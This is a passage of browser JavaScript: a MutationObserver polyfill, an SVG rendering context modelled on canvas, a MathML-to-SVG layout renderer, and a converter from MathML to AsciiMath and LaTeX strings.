          previousSibling: event.target.previousSibling,
          nextSibling: event.target.nextSibling,
          attributeName: event.attrName,
          attributeNamespace: undefined,
          oldValue: event.prevValue
        }], observer);
      }
    };
    this.listeners.push({
      target: target,
      handler: handler,
      options: options
    });
    if (options.attributes) {
      target.addEventListener("DOMAttrModified", handler, false);
    }
    if (options.characterData) {
      target.addEventListener("DOMCharacterDataModified", handler, false);
    }
    if (options.childList) {
      target.addEventListener("DOMNodeInserted", handler, false);
    }
    if (options.childList) {
      target.addEventListener("DOMNodeRemoved", handler, false);
    }
  };

  MutationObserver.prototype.disconnect = function () {
    while (this.listeners.length !== 0) {
      var listener = this.listeners.pop();
      var target = listener.target;
      var handler = listener.handler;
      var options = listener.options;
      if (options.attributes) {
        target.removeEventListener("DOMAttrModified", handler, false);
      }
      if (options.characterData) {
        target.removeEventListener("DOMCharacterDataModified", handler, false);
      }
      if (options.childList) {
        target.removeEventListener("DOMNodeInserted", handler, false);
      }
      if (options.childList) {
        target.removeEventListener("DOMNodeRemoved", handler, false);
      }
    }
  };

  MutationObserver.prototype.takeRecords = function() {
    return [];
  };

  if (window.MutationObserver == undefined) {
    window.MutationObserver = MutationObserver;
  }

}());

/*global document*/

(function () {
"use strict";

function round(v) {
  return (Math.floor(Math.pow(10, 6) * v + 0.5) / Math.pow(10, 6)).toString();
}

// see https://github.com/gliffy/canvas2svg/blob/master/canvas2svg.js
// canvas like API
function SVGRenderingContext2D(svg) {
  // public
  this.font = "normal 10px sans-serif";
  this.textBaseline = "alphabetic";
  this.textAlign = "start";
  // private
  this.svg = svg;
  this.svg.setAttribute("font-size", "16");//?
  this.svg.setAttribute("text-anchor", "middle");
  this.svg.setAttribute("fill", "currentColor");
  this.x = 0;
  this.y = 0;
  this.sx = 1;
  this.sy = 1;
  this.px = 0;
  this.py = 0;
}
SVGRenderingContext2D.prototype.translate = function (dx, dy) {
  this.x += dx;
  this.y += dy;
};
SVGRenderingContext2D.prototype.scale = function (sx, sy) {
  this.sx *= sx;
  this.sy *= sy;
  this.x /= sx;
  this.y /= sy;
};
SVGRenderingContext2D.prototype.fillText = function (text, dx, dy) {
  if (this.textBaseline !== "middle" || this.textAlign !== "center") {
    throw new RangeError();
  }
  var match = /^(italic|normal)\s+(normal|bold|\d+)?\s+(\d+(?:\.\d+)?)px\s(serif)$/.exec(this.font);
  if (match == null) {
    throw new RangeError();
  }
  var fontStyle = match[1];
  var fontWeight = match[2] || "normal";
  var fontSize = Number.parseFloat(match[3]);
  var e = document.createElementNS("http://www.w3.org/2000/svg", "text");
  e.setAttribute("x", round(this.x + dx));
  e.setAttribute("y", round(this.y + dy));
  if (round(this.sx) !== round(1) || round(this.sy) !== round(1)) {
    e.setAttribute("transform", "scale(" + round(this.sx) + ", " + round(this.sy) + ")");
    //e.setAttribute("dominant-baseline", "middle");//!TODO: FIX!
  }
  if (fontStyle !== "normal") {
    e.setAttribute("font-style", fontStyle);
  }
  if (fontWeight !== "normal" && fontWeight !== "400") {
    e.setAttribute("font-weight", fontWeight);
  }
  if (fontSize !== 16) {
    e.setAttribute("font-size", round(fontSize));
  }
  e.setAttribute("dy", "0.25em"); //TODO: FIX
  //e.setAttribute("text-anchor", "middle");
  //e.setAttribute("dominant-baseline", "central");
  // not supported in Opera, in Edge, in IE, in Safari (no "text-after-edge")
  //e.setAttribute("dominant-baseline", "text-after-edge");
  e.textContent = text;
  this.svg.appendChild(e);
};

SVGRenderingContext2D.prototype.measureText = function (text) {
  // TODO: performance
  // http://wilsonpage.co.uk/introducing-layout-boundaries/
  var tmp = document.getElementById("measure-text-element");
  if (tmp == null) {
    tmp = document.createElement("div");
    tmp.id = "measure-text-element";
    tmp.style.position = "fixed";
    tmp.style.top = "0px"; // affects layout root in Chrome
    tmp.style.left = "0px"; // affects layout root in Chrome
    tmp.style.whiteSpace = "nowrap";
    tmp.style.width = "0px";
    tmp.style.height = "0px";
    tmp.style.overflow = "hidden";
    tmp.style.visibility = "hidden";
    tmp.style.contain = "strict";//TODO: ?
    var span = document.createElement("span");
    span.style.font = "normal 16px serif";
    span.textContent = " ";
    tmp.appendChild(span);
    document.body.appendChild(tmp);
  }
  var span = tmp.querySelector("span");
  span.style.font = this.font;
  span.firstChild.textContent = text; //Note: on the TextNode
  var rect = span.getBoundingClientRect();
  var width = rect.right - rect.left;
  //tmp.parentNode.removeChild(tmp);
  return {
    width: width
  };
};

SVGRenderingContext2D.prototype.beginPath = function () {
};
SVGRenderingContext2D.prototype.moveTo = function (x, y) {
  this.px = x;
  this.py = y;
};
SVGRenderingContext2D.prototype.lineTo = function (x, y) {
  var e = document.createElementNS("http://www.w3.org/2000/svg", "line");
  e.setAttribute("x1", round(this.x + this.px));
  e.setAttribute("y1", round(this.y + this.py));
  e.setAttribute("x2", round(this.x + x));
  e.setAttribute("y2", round(this.y + y));
  e.setAttribute("stroke", "currentColor");
  this.svg.appendChild(e);
};
SVGRenderingContext2D.prototype.ellipse = function (cx, cy, rx, ry) {
  var e = document.createElementNS("http://www.w3.org/2000/svg", "ellipse");
  e.setAttribute("cx", round(this.x + cx));
  e.setAttribute("cy", round(this.y + cy));
  e.setAttribute("rx", round(rx));
  e.setAttribute("ry", round(ry));
  e.setAttribute("stroke", "currentColor");
  e.setAttribute("fill", "none");
  this.svg.appendChild(e);
};
SVGRenderingContext2D.prototype.stroke = function () {
};

globalThis.SVGRenderingContext2D = SVGRenderingContext2D;

}());

/*global SVGRenderingContext2D, console, document, XMLSerializer*/

(function () {
"use strict";

// see https://github.com/ForbesLindesay-Unmaintained/mathml-to-svg/pulls
function MathMLToSVG() {
}

MathMLToSVG.getFontSize = function (scriptlevel) {
  return Math.floor(16 * Math.pow(0.8, scriptlevel) + 0.5);
};

MathMLToSVG.makeFont = function (fontStyle, node, fontSize) {
  var fontWeight = window.getComputedStyle(node, null).fontWeight;
  return fontStyle + " " + fontWeight + " " + fontSize + "px" + " " + "serif";
};

MathMLToSVG.measure = function (context, node, scriptlevel) {
  var tagName = node.tagName.toLowerCase();
  var f = MathMLToSVG[tagName];
  if (f == null) {
    console.warn(tagName);
    f = MathMLToSVG["mrow"];
  }
  return f(context, node, scriptlevel);
};

var MI_MN_MO_MTEXT = function (context, node, scriptlevel) {
  var text = node.textContent.replace(/^\s+|\s+$/g, "");
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var font = MathMLToSVG.makeFont(node.tagName.toLowerCase() === "mi" && node.textContent.length === 1 ? "italic" : "normal", node, fontSize);
  context.font = font;
  var textWidth = context.measureText(text).width;
  var lspace = 0;
  var rspace = 0;
  // MathML3 spec has "Operator dictionary entries" with lspace+rspace table
  if (node.tagName.toLowerCase() === "mo") {
    var c = text;
    if (c === '\u2061' || c === '\u2062' || c === '\u2063' ||
        c === '(' || c === ')' || c === '|' || c === '{' || c === '}' ||
        node.nextElementSibling == null || node.previousElementSibling == null ||
        c === ',') {
      lspace = 0;
      rspace = 0;
    } else if (c === "\u00D7" || c === "+") {
      lspace = 4;
      rspace = 4;
    } else {
      lspace = 4;
      rspace = 4;
      console.warn(c);
    }
    //if (c === "\u2212" || c === "~") {
    //  space = 0;
    //}
    if (node.getAttribute("lspace") != null) {
      lspace = Number.parseFloat(node.getAttribute("lspace"));
    }
    if (node.getAttribute("rspace") != null) {
      rspace = Number.parseFloat(node.getAttribute("rspace"));
    }
  }
  lspace = fontSize * lspace / 18;
  rspace = fontSize * rspace / 18;
  return {
    baseline: 0,
    width: lspace + textWidth + rspace,
    height: fontSize,
    render: function () {
      context.translate(lspace, 0);
      context.font = font;
      context.textBaseline = "middle";
      context.textAlign = "center";
      context.fillText(text, textWidth / 2, fontSize / 2);
      context.translate(-lspace, 0);
    }
  };
};

MathMLToSVG.mi = MI_MN_MO_MTEXT;
MathMLToSVG.mn = MI_MN_MO_MTEXT;
MathMLToSVG.mo = MI_MN_MO_MTEXT;
MathMLToSVG.mtext = MI_MN_MO_MTEXT;

MathMLToSVG.mtable = function (context, node, scriptlevel) {
  var sizesByRow = [];
  for (var row = node.firstElementChild; row != null; row = row.nextElementSibling) {
    if (row.tagName.toLowerCase() === "mtr") {
      var rowCellSizes = [];
      for (var cell = row.firstElementChild; cell != null; cell = cell.nextElementSibling) {
        if (cell.tagName.toLowerCase() === "mtd") {
          var sizes = MathMLToSVG.measure(context, cell, scriptlevel);
          rowCellSizes.push(sizes);
        }
      }
      sizesByRow.push(rowCellSizes);
    }
  }
  var rows = sizesByRow.length;
  var cols = 0;
  for (var i = 0; i < rows; i += 1) {
    cols = Math.max(cols, sizesByRow[i].length);
  }

  var columnlines = (node.getAttribute("columnlines") || "none").split(" ");
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var columnspacing = Number.parseFloat(node.getAttribute("columnspacing") || "0.8em") * fontSize;
  var rowBaselines = [];
  for (var i = 0; i < rows; i += 1) {
    rowBaselines.push(0);
  }
  var rowHeights = [];
  for (var i = 0; i < rows; i += 1) {
    rowHeights.push(0);
  }
  var columnWidths = [];
  for (var i = 0; i < cols; i += 1) {
    columnWidths.push(0);
  }
  for (var i = 0; i < rows; i += 1) {
    var row = sizesByRow[i];
    var largestHeightAboveBaseline = 0;
    for (var j = 0; j < row.length; j += 1) {
      var sizes = row[j];
      largestHeightAboveBaseline = Math.max(largestHeightAboveBaseline, sizes.height - sizes.baseline);
    }
    for (var j = 0; j < row.length; j += 1) {
      var sizes = row[j];
      rowHeights[i] = Math.max(rowHeights[i], largestHeightAboveBaseline + sizes.baseline);
      columnWidths[j] = Math.max(columnWidths[j], sizes.width + columnspacing);
    }
    rowBaselines[i] = largestHeightAboveBaseline;
  }

  var height = 0;
  for (var i = 0; i < rowHeights.length; i += 1) {
    height += rowHeights[i];
  }
  var width = 0;
  for (var i = 0; i < columnWidths.length; i += 1) {
    width += columnWidths[i];
    width += columnlines[i % columnlines.length] === "none" ? 0 : 1;
  }

  return {
    baseline: height / 2 - fontSize / 2,
    width: width,
    height: height,
    render: function () {

      var y = 0;
      for (var i = 0; i < sizesByRow.length; i += 1) {
        var row = sizesByRow[i];
        var x = 0;
        for (var j = 0; j < row.length; j += 1) {
          var sizes = row[j];

          var ax = (columnWidths[j] - sizes.width) / 2;
          var ay = rowBaselines[i] - (sizes.height - sizes.baseline); // rowalign="baseline"

          context.translate(x + ax, y + ay);
          sizes.render();
          context.translate(-x - ax, -y - ay);

          x += columnWidths[j];
          var cl = columnlines[j % columnlines.length];
          if (cl !== "none") {
            context.beginPath();
            context.moveTo(x, y);
            context.lineTo(x, y + rowHeights[i]);
            context.stroke();
            x += 1;
          }
        }
        y += rowHeights[i];
      }
    }
  };
};

//TODO: REMOVE
MathMLToSVG.mfenced = function (context, node, scriptlevel) {
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var font = MathMLToSVG.makeFont("normal", node, fontSize);
  var measureFence = function (font, text) {
    context.font = font;
    return context.measureText(text).width;
  };
  var drawFence = function (font, text, textWidth, scaleX, scaleY, fontSize) {
    context.scale(scaleX, scaleY);
    context.font = font;
    context.textBaseline = "middle";
    context.textAlign = "center";
    context.fillText(text, textWidth / 2, fontSize / 2);
    context.scale(1 / scaleX, 1 / scaleY);
  };
  var open = node.getAttribute("open") || "(";
  var close = node.getAttribute("close") || ")";
  var child = node.firstElementChild;
  var sizes = MathMLToSVG.measure(context, child, scriptlevel);
  var openWidth = measureFence(font, open);
  var closeWidth = measureFence(font, close);
  var scaleY = sizes.height / fontSize;
  var scaleX = Math.sqrt(Math.sqrt(scaleY));
  return {
    baseline: sizes.baseline,
    width: openWidth + sizes.width + closeWidth + (scaleX - 1) * openWidth + (scaleX - 1) * closeWidth,
    height: sizes.height,
    render: function () {
      drawFence(font, open, openWidth, scaleX, scaleY, fontSize);
      context.translate(openWidth * scaleX, 0);
      sizes.render();
      context.translate(sizes.width, 0);
      drawFence(font, close, closeWidth, scaleX, scaleY, fontSize);
      context.translate(-sizes.width, 0);
      context.translate(-openWidth * scaleX, 0);
    }
  };
};

function isStretchyOperator(text) {
  return text === '(' || text === ')' || text === '{' || text === '}' || text === '|';
}

function isStretchy(node) {
  return node.tagName.toLowerCase() === 'mo' && isStretchyOperator(node.textContent);
}

var MATH_MROW = function (context, node, scriptlevel) {
  var baseline = 0;
  var width = 0;
  var height = 0;
  var childSizes = [];
  var child = node.firstElementChild;
  while (child != null) {
    var sizes = MathMLToSVG.measure(context, child, scriptlevel);
    baseline = Math.max(baseline, sizes.baseline);
    width += sizes.width;
    height = Math.max(height, sizes.height - sizes.baseline);
    var stretchy = isStretchy(child);
    childSizes.push({
      sizes: sizes,
      stretchy: stretchy
    });
    child = child.nextElementSibling;
  }

  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var scaleY = (height + baseline) / fontSize;
  var scaleX = Math.sqrt(Math.sqrt(scaleY));
  for (var i = 0; i < childSizes.length; i += 1) {
    var sizes = childSizes[i].sizes;
    var stretchy = childSizes[i].stretchy;
    if (stretchy) {
      width += (scaleX - 1) * sizes.width;
    }
  }

  return {
    baseline: baseline,
    width: width,
    height: height + baseline,
    render: function () {
      var x = 0;
      for (var i = 0; i < childSizes.length; i += 1) {
        var sizes = childSizes[i].sizes;
        var stretchy = childSizes[i].stretchy;
        var ay = height - (sizes.height - sizes.baseline);
        context.translate(x, 0);
        if (stretchy) {
          context.scale(scaleX, scaleY);
        } else {
          context.translate(0, ay);
        }
        sizes.render();
        if (stretchy) {
          context.scale(1 / scaleX, 1 / scaleY);
        } else {
          context.translate(0, -ay);
        }
        context.translate(-x, 0);
        if (stretchy) {
          x += (scaleX - 1) * sizes.width;
        }
        x += sizes.width;
      }
    }
  };
};

MathMLToSVG.math = MATH_MROW;
MathMLToSVG.mrow = MATH_MROW;
MathMLToSVG.mtd = MATH_MROW;

//TODO: REMOVE
MathMLToSVG.mstyle = MATH_MROW;

MathMLToSVG.mpadded = function (context, node, scriptlevel) {
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var width = Number.parseFloat(node.getAttribute("width")) * fontSize;
  var lspace = Number.parseFloat(node.getAttribute("lspace")) * fontSize;
  var sizes = MATH_MROW(context, node, scriptlevel);
  return {
    baseline: sizes.baseline,
    width: width + sizes.width,
    height: sizes.height,
    render: function () {
      context.translate(lspace, 0);
      sizes.render();
      context.translate(-lspace, 0);
    }
  };
};

MathMLToSVG.mfrac = function (context, node, scriptlevel) {
  var top = node.firstElementChild;
  var bottom = top.nextElementSibling;
  var topSizes = MathMLToSVG.measure(context, top, scriptlevel + 1);
  var bottomSizes = MathMLToSVG.measure(context, bottom, scriptlevel + 1);
  var width = Math.max(topSizes.width, bottomSizes.width);
  var height = 1 + topSizes.height + bottomSizes.height;
  var fontSize = MathMLToSVG.getFontSize(scriptlevel + 1);
  return {
    baseline: 0.5 + bottomSizes.height - 0.5 * fontSize,
    width: width,
    height: height,
    render: function () {
      context.translate((width - topSizes.width) / 2, 0);
      topSizes.render();
      context.translate(-(width - topSizes.width) / 2, 0);

      var middle = topSizes.height - 0.5;
      context.beginPath();
      context.moveTo(0, middle);
      context.lineTo(width, middle);
      context.stroke();

      context.translate((width - bottomSizes.width) / 2, 1 + topSizes.height);
      bottomSizes.render();
      context.translate(-(width - bottomSizes.width) / 2, -1 - topSizes.height);
    }
  };
};

var MSUP_MSUB = function (context, node, scriptlevel) {
  var base = node.firstElementChild;
  var exponent = base.nextElementSibling;
  var baseSizes = MathMLToSVG.measure(context, base, scriptlevel);
  var exponentSizes = MathMLToSVG.measure(context, exponent, scriptlevel + 1);
  var width = baseSizes.width + exponentSizes.width;
  var fontSize = MathMLToSVG.getFontSize(scriptlevel + 1);
  var height = baseSizes.height + exponentSizes.height - 0.5 * fontSize;
  var isMSUP = node.tagName.toLowerCase() === "msup";
  return {
    baseline: isMSUP ? 0 : 0.5 * fontSize,
    width: width,
    height: height,
    render: function () {
      if (isMSUP) {
        context.translate(0, 0.5 * fontSize);
      }
      baseSizes.render();
      if (isMSUP) {
        context.translate(0, -0.5 * fontSize);
      }
      if (!isMSUP) {
        context.translate(0, baseSizes.height - 0.5 * fontSize);
      }
      context.translate(baseSizes.width, 0);
      exponentSizes.render();
      context.translate(-baseSizes.width, 0);
      if (!isMSUP) {
        context.translate(0, -baseSizes.height + 0.5 * fontSize);
      }
    }
  };
};

MathMLToSVG.msup = MSUP_MSUB;
MathMLToSVG.msub = MSUP_MSUB;

MathMLToSVG.menclose = function (context, node, scriptlevel) {
  var sizes = MATH_MROW(context, node, scriptlevel); // 1*
  var notation = node.getAttribute("notation").split(" ");
  return {
    baseline: sizes.baseline,
    width: sizes.width,
    height: sizes.height,
    render: function () {
      sizes.render();
      var width = sizes.width;
      var height = sizes.height;
      for (var i = 0; i < notation.length; i += 1) {
        var n = notation[i];
        if (n !== "") {
          context.beginPath();
          if (n === "circle") {
            context.ellipse(width / 2, height / 2, width / 2, height / 2, 0, 0, 2 * Math.PI, true);
          } else if (n === "verticalstrike") {
            context.moveTo(width / 2, 0);
            context.lineTo(width / 2, height);
          } else if (n === "horizontalstrike") {
            context.moveTo(0, height / 2);
            context.lineTo(width, height / 2);
          }
          context.stroke();
        }
      }
    }
  };
};

var MSQRT_MROOT = function (context, node, scriptlevel) {
  var isMSQRT = node.tagName.toLowerCase() === "msqrt";
  var surd = "\u221A";
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var font = MathMLToSVG.makeFont("normal", node, fontSize);
  context.font = font;
  var surdWidth = context.measureText(surd).width;
  var h = 1;
  var base = isMSQRT ? node : node.firstElementChild;
  var index = isMSQRT ? undefined : base.nextElementSibling;
  // 1* for msqrt
  var baseSizes = isMSQRT ? MATH_MROW(context, base, scriptlevel) : MathMLToSVG.measure(context, base, scriptlevel);
  var indexSizes = isMSQRT ? undefined : MathMLToSVG.measure(context, index, scriptlevel + 2);
  return {
    baseline: baseSizes.baseline,
    width: baseSizes.width + surdWidth,
    height: baseSizes.height + h + 2,
    render: function () {
      context.translate(0, (baseSizes.height - fontSize) / 2 + 2);
      context.font = font;
      context.textBaseline = "middle";
      context.textAlign = "center";
      context.fillText(surd, surdWidth / 2, fontSize / 2);
      context.translate(0, -(baseSizes.height - fontSize) / 2 - 2);
      context.beginPath();
      context.moveTo(surdWidth, 0);
      context.lineTo(surdWidth + baseSizes.width, 0);
      context.stroke();
      context.translate(surdWidth, h + 2);
      baseSizes.render();
      context.translate(-surdWidth, -h - 2);
      if (!isMSQRT) {
        context.translate(0, -0.25 * fontSize + 2);
        indexSizes.render();
        context.translate(0, 0.25 * fontSize - 2);
      }
    }
  };
};

MathMLToSVG.msqrt = MSQRT_MROOT;
MathMLToSVG.mroot = MSQRT_MROOT;

MathMLToSVG.munder = function (context, node, scriptlevel) {
  var first = node.firstElementChild;
  var second = first.nextElementSibling;
  var firstSizes = MathMLToSVG.measure(context, first, scriptlevel);
  var secondSizes = MathMLToSVG.measure(context, second, scriptlevel);
  var width = Math.max(firstSizes.width, secondSizes.width);
  var height = firstSizes.height + secondSizes.height;
  return {
    baseline: secondSizes.height,
    width: width,
    height: height,
    render: function () {
      context.translate((width - firstSizes.width) / 2, 0);
      firstSizes.render();
      context.translate(-(width - firstSizes.width) / 2, 0);
      context.translate(0, firstSizes.height);
      secondSizes.render();
      context.translate(0, -firstSizes.height);
    }
  };
};

//?
MathMLToSVG.drawMathMLElement = function (element) {
  var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
  var svgContext = new SVGRenderingContext2D(svg);
  var sizes = MathMLToSVG.measure(svgContext, element, 0);
  var width = sizes.width;
  var height = sizes.height;
  svg.setAttribute("width", width + "px");
  svg.setAttribute("height", height + "px");
  svg.setAttribute("viewBox", "0 0 " + width + " " + height);
  sizes.render();
  var data = (new XMLSerializer()).serializeToString(svg);
  var src = "data:image/svg+xml;charset=utf-8," + encodeURIComponent(data);
  return {
    src: src,
    width: width,
    height: height
  };
};

globalThis.MathMLToSVG = MathMLToSVG;

}());


(function () {
"use strict";

//TODO:
//? "â‰ ": {replacement: "=", precedence: 2, isRightToLeftAssociative: false}

var operators = {
  ",": {replacement: ",", precedence: -10, isRightToLeftAssociative: false},//?
  "\u2192": {replacement: "->", precedence: -9, isRightToLeftAssociative: false},//? &rarr;
  "\u2194": {replacement: "<->", precedence: -9, isRightToLeftAssociative: false},//? &harr;
  ".^": {replacement: ".^", precedence: 7, isRightToLeftAssociative: true},
  "^": {replacement: "^", precedence: 6, isRightToLeftAssociative: true},
  "\u00D7": {replacement: "*", precedence: 5, isRightToLeftAssociative: false},// &times;
  "\u22C5": {replacement: "*", precedence: 5, isRightToLeftAssociative: false},// &sdot;
  "\u2061": {replacement: "", precedence: 6, isRightToLeftAssociative: false},// &af;
  //TODO: ? cosx
  "\u2062": {replacement: "*", precedence: 5, isRightToLeftAssociative: false},// &it;
  "\u2063": {replacement: ",", precedence: -10, isRightToLeftAssociative: false},// &ic;
  "/": {replacement: "/", precedence: 5, isRightToLeftAssociative: false},
  "\u2215": {replacement: "/", precedence: 5, isRightToLeftAssociative: false},
  "\u2212": {replacement: "-", precedence: 3, isRightToLeftAssociative: false}, // &minus;
  "+": {replacement: "+", precedence: 2, isRightToLeftAssociative: false}
};

var brackets = {
  '(': true,
  '{': true,
  ')': true,
  '}': true,
  '|': true
};

var fence = function (x, operator, left, format) {
  return (x.precedence < operators[operator].precedence || (x.precedence === operators[operator].precedence && (left && operators[operator].isRightToLeftAssociative || !left && !operators[operator].isRightToLeftAssociative))) ? (format === "LaTeX" ? "\\left(" : "(") + x.string + (format === "LaTeX" ? "\\right)" : ")") : x.string;
};

var transformMTABLE = function (node, format) {
  function isStrikedRow(node) {
    return node.firstElementChild != null &&
           node.firstElementChild.tagName.toLowerCase() === 'mtd' &&
           node.firstElementChild.childElementCount === 1 &&
           node.firstElementChild.firstElementChild.tagName.toLowerCase() === 'menclose' &&
           (node.firstElementChild.firstElementChild.getAttribute('notation') === 'horizontalstrike' || (node.firstElementChild.firstElementChild.getAttribute('notation') || '').indexOf('horizontalstrike') !== -1); // TODO: remove
  }
  function isStrikedColumn(node) {
    return node.childElementCount === 1 &&
           node.firstElementChild.tagName.toLowerCase() === 'menclose' &&
           node.firstElementChild.getAttribute('notation') === 'verticalstrike';
  }
  var childNode = node.firstElementChild;
  var rows = "";
  rows += (format === "LaTeX" ? "\\begin{matrix}\n" : "{");
  var isFirstRow = true;
  while (childNode != undefined) {
    if (childNode.tagName.toLowerCase() === 'mtr' && !isStrikedRow(childNode)) {
      var c = childNode.firstElementChild;
      var row = "";
      while (c != undefined) {
        if (c.tagName.toLowerCase() === 'mtd' && !isStrikedColumn(c)) {
          row += (row !== "" ? (format === "LaTeX" ? " & " : ", ") : "") + fence(transformMathML(c, format), ",", true, format);
        }
        c = c.nextElementSibling;
      }
      rows += (!isFirstRow ? (format === "LaTeX" ? " \\\\\n" : ", ") : "") + (format === "LaTeX" ? "" : "{") + row + (format === "LaTeX" ? "" : "}");
      isFirstRow = false;
    }
    childNode = childNode.nextElementSibling;
  }
  rows += (format === "LaTeX" ? "\n\\end{matrix}" : "}");
  return rows; // "(" + ... + ")" ?
};

function TransformResult(string, precedence) {
  this.string = string;
  this.precedence = precedence;
}

//! This function is also used to convert copy-pasted mathml, so it may support more tags than produced by the site itself.
var transformMathML = function (node, format, inferredMROW) {
  inferredMROW = inferredMROW != undefined ? inferredMROW : false;
  if (format !== "AsciiMath" && format !== "LaTeX") {
    throw new RangeError(format);
  }
  var tagName = inferredMROW ? "mrow" : node.tagName.toLowerCase();
  if (tagName === "math" ||
      tagName === "munder" ||
      tagName === "mover" ||
      tagName === "munderover" || //TODO:
      tagName === "mtr" ||
      tagName === "mtd" ||
      tagName === "mrow" ||
      tagName === "mfenced" ||
      tagName === "menclose" ||
      tagName === "mpadded" ||
      tagName === "mstyle" ||
      tagName === "mo" ||
      tagName === "mi" ||
      tagName === "mn") {
    var s = "";
    var p = 42;
    if (tagName === "mi" || tagName === "mn" || tagName === "mo") {
      // Google Translate inserts <font> tags
      s = node.textContent;
    } else {
      var childNode = node.firstElementChild;
      while (childNode != undefined) {
        var tmp = transformMathML(childNode, format);
        if (tagName === "munder" && (s === "=" || s === "~" || s.length === 1) && tmp.string !== "") {//!
          s = s + "[" + tmp.string + "]" + s;
        } else if (tagName === "munderover") {
          if (childNode === node.firstElementChild.nextElementSibling) {
            s += "_(" + tmp.string + ")";
          } else if (childNode === node.firstElementChild.nextElementSibling.nextElementSibling) {
            s += "^(" + tmp.string + ")";
          } else {
            s += tmp.string;
          }
        } else {
          s += tmp.string;
        }
        if (p > tmp.precedence) {
          p = tmp.precedence;
        }
        childNode = childNode.nextElementSibling;
      }
    }
    if (node.firstElementChild != null && node.firstElementChild.tagName.toLowerCase() === 'mo' && brackets[node.firstElementChild.textContent] != null &&
        node.lastElementChild != null && node.lastElementChild.tagName.toLowerCase() === 'mo' && brackets[node.lastElementChild.textContent] != null) {
      if (format === "LaTeX") {
        s = '\\left' + s.slice(0, -1) + '\\right' + s.slice(-1);
      }
      p = 42;
    }
    if (tagName === "mo") {
      var o = operators[s];
      var precedence = o == undefined ? 0 : o.precedence;
      if (p > precedence) {
        p = precedence;
      }
      s = o == undefined ? s : o.replacement;
    }
    if (tagName === 'mi') {
      if (s === '\u2147') {
        s = 'e';
      } else if (s === '\u2148') {
        s = 'i';
      }
      if (format === "LaTeX") {
        if (s.length === 1 && s.charCodeAt(0) >= 0x03B1 && s.charCodeAt(0) <= 0x03B1 + 24) {
          var greek = " alpha beta gamma delta epsilon zeta eta theta iota kappa lambda mu nu xi omicron pi rho varsigma sigma tau upsilon phi chi psi omega ";
          s = greek.split(' ')[s.charCodeAt(0) - 0x03B1 + 1];
        }
      }
    }
    //TODO: fix
    if (tagName === "mi" && s.length > 1) {
      s = (format === "LaTeX" ? "\\" : "") + s;
    }
    //
    if (tagName === "mn" && s.indexOf(",") !== -1) {
      p = -10 - 1;
    }
    if (tagName === "mo" && s === "," && (node.getAttribute("rspace") != null || node.closest('msub') == null)) {//TODO: ?
      s += " ";
    }
    return tagName === "mfenced" ? new TransformResult((format === "LaTeX" ? "\\left" : "") + (node.getAttribute("open") || "(") + s + (format === "LaTeX" ? "\\right" : "") + (node.getAttribute("close") || ")"), 42) : new TransformResult(s, p);
  }
  if (tagName === "msup") {
    return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + fence(transformMathML(node.firstElementChild.nextElementSibling, format), "^", false, format), operators["^"].precedence);
  }
  if (tagName === "msub") {
    //TODO: fix a_(1,2) ?
    var b = transformMathML(node.firstElementChild, format).string;
    var x = transformMathML(node.firstElementChild.nextElementSibling, format).string;
    return new TransformResult(b + "_" + (format === "LaTeX" ? (x.length > 1 ? '{' + x + '}' : x) : (x.indexOf(",") !== -1 ? "(" + x + ")" : x)), 42); // "(" + ... + ")" ?
  }
  if (tagName === "mfrac") {
    var n = transformMathML(node.firstElementChild, format);
    var d = transformMathML(node.firstElementChild.nextElementSibling, format);
    if (format === "LaTeX") {
      return new TransformResult("\\frac" + "{" + n.string + "}" + "{" + d.string + "}", 42);
    }
    // https://www.unicode.org/notes/tn28/UTN28-PlainTextMath-v3.1.pdf
    return new TransformResult(fence(n, "/", true, format) + (node.getAttribute("linethickness") === "0" ? "Â¦" : "/") + fence(d, "/", false, format), operators["/"].precedence);
  }
  if (tagName === "msqrt") {
    return new TransformResult((format === "LaTeX" ? "\\" : "") + "sqrt" + (format === "LaTeX" ? "{" : "(") + transformMathML(node, format, true).string + (format === "LaTeX" ? "}" : ")"), 42);
  }
  if (tagName === "mroot") {
    return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + "(" + "1" + "/" + transformMathML(node.firstElementChild.nextElementSibling, format).string + ")", operators["^"].precedence);
  }
  if (tagName === "mtable") {
    return new TransformResult(transformMTABLE(node, format), 42);
  }
  if (tagName === "mtext") {//?
    //return new TransformResult("", 42);
    var length = 0;
    var child = node.firstChild;
    while (child != null) {
      length += 1;
      child = child.nextSibling;
    }
    var range = {
      startContainer: node,
      startOffset: 0,
      endContainer: node,
      endOffset: length,
      commonAncestorContainer: node
    };
    var ss = window.serializeAsPlainText(range);
    ss = ss.trim();
    if (ss === "(?)" || ss === "?") {//TODO: ?
      ss = "";
    }
    return new TransformResult(ss === "" ? "" : (format === "LaTeX" ? "text(" : "\"") + ss + (format === "LaTeX" ? ")" : "\""), 42);
  }
  if (tagName === "maction") {
    console.info('only first child is handled for <maction>');
    return transformMathML(node.firstElementChild, format);
  }
  if (tagName === "mspace") {
    console.info('ignore <mspace>');
    return new TransformResult("", 42);
  }
  throw new TypeError("transformMathML:" + tagName);
};

globalThis.transformMathML = transformMathML;

}());

/*global transformMathML, XMLSerializer, DOMParser */

(function () {
  "use strict";

// TODO: remove?
// an array of array of strings -> string
var toMultilineString = function (array) {
  var table = new Array(array.length);
  for (var i = 0; i < array.length; i += 1) {
    var elements = array[i];
    var row = new Array(elements.length);
    for (var j = 0; j < elements.length; j += 1) {
      row[j] = elements[j].toString().replace(/^\s+|\s+$/g, '');
    }
    table[i] = row;
  }
  var columns = 0;
  for (var i = 0; i < array.length; i += 1) {
    columns = Math.max(columns, array[i].length);
  }
  var columnWidths = new Array(columns);
  for (var i = 0; i < columns; i += 1) {
    columnWidths[i] = 0;
  }
  for (var i = 0; i < table.length; i += 1) {
    var row = table[i];
    for (var j = 0; j < row.length; j += 1) {
      columnWidths[j] = Math.max(columnWidths[j], row[j].length);
    }
  }
  var result = '';
  for (var i = 0; i < table.length; i += 1) {
    var row = table[i];
    result += (i !== 0 ? '\n' : '');
    for (var j = 0; j < columns; j += 1) {
      var e = j < row.length ? row[j] : '';
      result += (j !== 0 ? '\t' : '');
